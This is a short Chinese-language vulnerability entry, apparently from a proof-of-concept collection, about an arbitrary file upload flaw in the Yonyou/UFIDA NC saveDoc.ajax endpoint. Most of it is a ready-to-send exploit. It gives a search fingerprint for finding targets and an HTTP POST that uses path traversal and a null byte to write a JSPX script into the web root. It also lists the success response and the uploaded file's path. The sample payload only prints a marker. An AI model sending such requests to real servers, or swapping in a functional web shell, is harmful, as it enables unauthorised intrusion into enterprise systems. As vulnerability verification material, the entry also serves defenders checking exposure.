﻿# 用友-UFIDA-NC saveDoc.ajax 存在任意文件上传漏洞

> 更新时间：2024-03-08

> 漏洞编号：

> 漏洞说明：用友NC Cloud大型企业数字化平台，深度应用新一代数字智能技术，完全基于云原生架构，打造开放、互联、融合、智能的一体化云平台，聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方向，提供涵盖数字营销、财务共享、全球司库、智能制造、敏捷供应链、人才管理、智慧协同等18大解决方案，帮助大型企业全面落地数智化。

用友-UFIDA-NC saveDoc.ajax 存在任意文件上传，攻击者可通过此漏洞上传恶意脚本文件，对服务器的正常运行造成安全威胁！

> 漏洞特征：title="产品登录界面"

> 验证脚本：HTTP

```
POST /uapws/saveDoc.ajax?ws=/../../dudesite.jspx%00 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
      <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
   <hi:scriptlet>
            out.println("dudesite");
   </hi:scriptlet>
</hi>


```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/uapws/dudesite.jspx

> 验证文件来源：用友-UFIDA-NC saveDoc.ajax 存在任意文件上传漏洞.poc

